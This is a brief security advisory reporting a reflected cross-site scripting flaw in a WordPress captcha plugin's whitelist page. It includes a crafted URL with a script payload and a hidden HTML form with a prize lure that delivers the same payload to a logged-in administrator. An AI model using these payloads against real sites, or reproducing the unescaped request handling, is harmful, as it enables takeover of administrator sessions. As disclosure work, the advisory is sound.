Description
================================================================================
Unsanitized input in whitelist.php:

297: $message = __( 'Search results for', $this->textdomain ) . '&nbsp;:&nbsp;' . $_REQUEST['s'];


PoC
================================================================================
The variable can be passed in using a get as well as a post. An attacker
could send unsuspecting authenticated admin a url crafted like such:

http://wwww.victim.com/wp-admin/admin.php?page=captcha.php&action=whitelist&s=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E

or they can send a form (no CSRF token check)

<form method="post" action="http://victim.com/wp-admin/admin.php?page=captcha.php&action=whitelist">
<input type="hidden" name="s" value="<script>alert(1);</script>">
<input type="submit" name="Search IP" value="Click here to claim your prize!">
</form>

and it would execute XSS as long as they were logged in to the site.
